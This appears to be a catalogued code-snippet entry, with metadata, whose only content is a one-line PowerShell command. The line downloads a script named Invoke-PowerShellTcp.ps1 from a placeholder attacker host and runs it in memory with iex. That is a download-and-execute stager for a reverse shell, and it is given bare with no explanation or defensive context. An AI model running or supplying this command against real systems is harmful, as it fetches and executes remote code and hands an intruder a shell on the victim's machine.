---
id: bdb78d97-0154-4a69-a420-45d13a8d4243
type: code
language: Powershell
verified: false
created_at: '2020-03-16T19:29:43.559754+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet bdb78d97

**Language**: Powershell

```powershell
iex (New-Object Net.WebClient).downloadString('http://$_TARGET_IP/Invoke-PowerShellTcp.ps1')
```


